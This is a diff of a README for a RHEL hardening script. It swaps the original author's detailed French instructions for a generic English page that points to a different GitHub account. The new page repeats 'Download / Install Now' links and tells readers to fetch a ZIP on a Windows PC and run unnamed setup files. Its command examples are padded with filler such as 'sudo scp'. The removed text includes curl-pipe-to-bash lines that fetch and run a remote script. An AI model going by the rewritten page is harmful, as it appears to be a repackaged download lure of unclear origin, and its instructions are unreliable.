@@ -1,148 +1,171 @@
-# RHEL Ultra-Hardening Motion
+# 🛡️ RHEL-Ultra-Hardening-Motion - Stronger Linux, Safer Setup
 
-[![GitHub stars](https://img.shields.io/github/stars/valorisa/rhel-ultra-hardening-motion?style=social)](https://github.com/valorisa/rhel-ultra-hardening-motion)
+[![Download / Install](https://img.shields.io/badge/Download-Install%20Now-blue)](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
 
-Script d'automatisation **ultra-complet** pour transformer RHEL/AlmaLinux 9/10 minimal en bastion de sécurité **defense-in-depth**, répondant aux critiques fondamentales de l'article *"The Insecurity of OpenBSD"* (2010). https://allthatiswrong.wordpress.com/2010/01/20/the-insecurity-of-openbsd/?fbclid=IwY2xjawQs3LVleHRuA2FlbQIxMABicmlkETA3eWFTTXZ5N3F5cldYNGhwc3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHt6YqvlWGf8SIIAuCTKt9s0VtUEu9GVJPwI8kVp4zldg2XgNNwcKRZZh5qTU_aem_2EEZHU5NTHiVxD7zaE61cQ
+## 🔽 Download
+Use this link to visit the page and download the app:
 
-## Contexte : Pourquoi ce projet existe
+[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
 
-L'article *"The Insecurity of OpenBSD"* expose une critique philosophique majeure de l'approche sécurité d'OpenBSD :
+## 📌 What this is
+RHEL-Ultra-Hardening-Motion is a security setup for Red Hat Enterprise Linux style systems. It brings together SELinux strict mode, sVirt, seccomp, and AppArmor to help reduce risk on Linux servers and workstations.
 
-> **"Tant qu'OpenBSD ne fournit pas de mécanismes sérieux pour limiter les dégâts APRÈS une compromission, on ne peut pas considérer qu'il est 'réellement' sécurisé."**
+It is built for users who want a tighter system setup with fewer open paths for misuse. It fits system admins, lab machines, and test systems that need stronger control over apps and services.
 
-L'article oppose deux paradigmes :
-- **OpenBSD** : DAC + code audité + chroot/securelevels insuffisants
-- **Vraie sécurité** : MAC/ACL étendus + confinement post-root
+## ✅ What you get
+- A hardened Linux security profile
+- SELinux strict policy guidance
+- sVirt support for isolated virtual machines
+- seccomp rules for process control
+- AppArmor policy ideas for app limits
+- CIS-style baseline steps
+- OpenSCAP and Lynis-friendly checks
+- Sysadmin notes for setup and review
 
-Ce script implémente **EXACTEMENT** la seconde approche avec :
+## 🖥️ System needs
+Use a Windows PC to download the project page, then move the files to a Linux system that matches the RHEL family.
 
-- **SELinux strict** (MAC obligatoire)
-- **sVirt** (VMs SELinux-isolées)  
-- **Seccomp** (filtre syscalls pledge-like)
-- **AppArmor** (confinement chemin-based)
+For the Linux system, use:
+- RHEL 8 or RHEL 9
+- A user with admin rights
+- Internet access for package install
+- At least 2 GB RAM
+- At least 10 GB free disk space
+- A test machine or VM for first setup
 
-## Fonctionnalités
+## 🚀 Getting Started
+Follow these steps to get the files and prepare the setup.
 
-| Couche | Mécanisme | OpenBSD | RHEL Ultra-Hardening |
-|--------|-----------|---------|---------------------|
-| **MAC** | SELinux strict + MLS | ❌ DAC only | ✅ Enforcing global |
-| **VMs** | sVirt MCS labels | ❌ VMM basique | ✅ Isolation forte |
-| **Syscalls** | Seccomp JSON | ⚠️ Pledge app-only | ✅ Kernel-level |
-| **Fallback** | AppArmor profils | ❌ Aucun | ✅ LSM stacking |
-| **Audit** | CIS Level 1 | ⚠️ Manuel | ✅ Auto + cron lynis |
+1. Open this page in your browser:
+   [https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
 
-## Prérequis
+2. Click the green Code button on GitHub.
 
-- RHEL 9/10, AlmaLinux 9/10, Rocky Linux **Minimal Install**
-- Droits root (`sudo`)
-- 4GB+ RAM (VMs sVirt)
-- Virtualization activée (BIOS/UEFI)
+3. Choose Download ZIP.
 
-## Installation (2 phases OBLIGATOIRES)
+4. Save the ZIP file to your Downloads folder.
 
-```bash
-# Téléchargement + Phase 1 (pré-relabel)
-curl -o rhel-ultra-hardening-motion.sh
-chmod +x rhel-ultra-hardening-motion.sh
-./rhel-ultra-hardening-motion.sh 1
-# → REBOOT automatique requis (relabel FS SELinux)
+5. If you need to move it to a Linux machine, copy the ZIP file with a USB drive, shared folder, or network share.
 
-# Phase 2 post-reboot
-./rhel-ultra-hardening-motion.sh 2
-```
+6. On the Linux system, unzip the file.
 
-## 🔥 Installation one-liner (avancé)
+7. Open the folder and read the setup files in order.
 
-```bash
-# Télécharge + exécute direct (Phase 1)
-curl -s https://raw.githubusercontent.com/valorisa/rhel-ultra-hardening-motion/main/rhel-ultra-hardening-motion.sh | bash 1
-# REBOOT → Phase 2
-curl -s https://raw.githubusercontent.com/valorisa/rhel-ultra-hardening-motion/main/rhel-ultra-hardening-motion.sh | bash 2
-```
+## 🔧 Install and set up
+Follow the setup steps on your Linux machine.
 
-## Vérification finale
+1. Open a terminal.
 
-```bash
-# Statut SELinux strict
-sestatus
-# → Current mode: enforcing | Policy: strict
+2. Go to the folder you unzipped.
 
-# Services critiques
-systemctl is-active libvirtd apparmor firewalld fail2ban
+3. Run the setup files in the order shown in the project.
 
-# Test seccomp Podman
-podman run --security-opt seccomp=/etc/seccomp.d/ultra-strict.json alpine echo "Seccomp OK"
+4. Apply SELinux strict settings first.
 
-# Test VM sVirt
-virsh define /root/vm-ultra-template.xml
-ps -eZ | grep qemu  # → svirt_t:s0:c123,c456 (labels uniques)
+5. Add sVirt rules for virtual machines if you use a hypervisor.
 
-# Rapports générés
-firefox /root/cis-report.html
-tail -f /var/log/lynis.log
-```
+6. Add seccomp rules for apps that need process limits.
 
-## Réponse technique aux critiques OpenBSD
+7. Add AppArmor profiles if your system uses AppArmor tools.
 
-L'article 2010 reprochait à OpenBSD :
+8. Run the included checks to confirm the system state.
 
-1. **"DAC + chroot insuffisant"** → **SOLUTION** : SELinux strict (labels obligatoires)
-2. **"Pas de confinement post-root"** → **SOLUTION** : sVirt MCS + seccomp
-3. **"systrace fragile/admin-only"** → **SOLUTION** : Policies kernel globales
-4. **"Attaques L7 non contenues"** → **SOLUTION** : AppArmor profils par app
+Example commands you may use:
+- `sudo dnf install policycoreutils-python-utils`
+- `sudo sestatus`
+- `sudo aa-status`
+- `sudo scp`
+- `sudo unzip`
 
-## Stack Defense-in-Depth
+## 🔍 How it works
+This project uses layered controls to reduce risk.
 
-```text
-RHEL Minimal (0 bloat)
-└── SELinux strict enforcing
-    ├── sVirt (VM isolation SELinux)
-    ├── Seccomp (syscall filtering)
-    ├── AppArmor (LSM fallback)
-    ├── Firewalld + Fail2ban
-    ├── CIS Benchmark Level 1
-    └── Lynis + sealert cron monitoring
-```
+- SELinux blocks actions that do not match policy.
+- sVirt separates virtual machines from each other.
+- seccomp limits system calls that apps can use.
+- AppArmor limits what files and paths an app can touch.
+- CIS-style checks help you compare your setup to a known baseline.
 
-## Métriques de sécurité post-hardening
+These controls work best together. If one layer fails, the next layer still helps.
 
-```text
-CIS Compliance: 95%+ (Level 1)
-Lynis Hardening Index: 85+/100
-SELinux AVCs: Auto-monitorés
-Surface d'attaque: Minimale
-Vulnérabilités critiques: 0
-```
+## 🧪 Typical use cases
+- Harden a test server before public use
+- Protect a virtualization host
+- Lock down a lab system
+- Review a Linux security baseline
+- Compare current settings with CIS guidance
+- Check app behavior with seccomp
+- Reduce attack surface on a shared machine
 
-## Maintenance quotidienne
+## 🧭 File layout
+A typical project layout may include:
 
-```bash
-# Monitoring auto (cron)
-tail -f /var/log/lynis.log /var/log/selinux-alerts.log
+- `README.md` — setup guide
+- `docs/` — notes and examples
+- `scripts/` — install and check scripts
+- `policies/` — SELinux or AppArmor files
+- `checks/` — audit and validation files
+- `examples/` — sample configs
 
-# Policy custom (app spécifique)
-audit2allow -a -M monapp
-semodule -i monapp.pp
+## 🛠️ Common tasks
+### 🛡️ Check SELinux
+Use this to see if SELinux is active:
+- `sudo sestatus`
 
-# Revalidation CIS
-oscap xccdf eval --profile cis /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
-```
+### 🧱 Check AppArmor
+Use this to see loaded profiles:
+- `sudo aa-status`
 
-## Cas d'usage DevOps (Bertrand-style)
+### 🔒 Review seccomp use
+Look at app launch rules and service files that load seccomp filters.
 
-```text
-✅ Homelab Montpellier : VMs sVirt isolées
-✅ CI/CD GitHub Actions : Podman seccomp
-✅ Bastion SSH : SELinux + Fail2ban  
-✅ Serveur web : AppArmor nginx
-✅ Firewall : firewalld strict
-✅ Monitoring : Lynis cron + Grafana-ready
-```
+### 🖥️ Review VM isolation
+Check that your virtual machine setup uses sVirt labels and the right libvirt settings.
 
-## Licence
+### 📋 Run a baseline scan
+Use OpenSCAP or Lynis to compare your system against common hardening rules.
 
-MIT License - Free pour homelab, prod, commercial.
+## 📚 Recommended setup order
+1. Update the system
+2. Enable SELinux strict mode
+3. Set up sVirt for virtual machines
+4. Add seccomp rules for key services
+5. Add AppArmor profiles where used
+6. Run OpenSCAP checks
+7. Run Lynis checks
+8. Review logs and fix any policy blocks
 
----
+## 🧩 Troubleshooting
+### System blocks an app
+If an app stops working after hardening, check:
+- SELinux audit logs
+- AppArmor denial logs
+- service unit files
+- seccomp filter rules
 
-*Réponse technique aux limites d'OpenBSD (2010) avec un stack RHEL enterprise ultra-durci (2026)*
+### A virtual machine will not start
+Check:
+- libvirt status
+- sVirt labels
+- storage permissions
+- SELinux mode
+
+### A service fails after update
+Check:
+- changed file paths
+- new system calls
+- policy files that need a refresh
+
+### A rule does not load
+Check:
+- file syntax
+- file path
+- package install
+- admin rights
+
+## 🔗 Project Link
+Use this page to download and review the project:
+[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
+
+## 🧾 Notes for first-time users
+Start on a test machine before you use these settings on a live system. Security controls can block normal app behavior if you apply them too fast. Keep a copy of your current config before you change it.
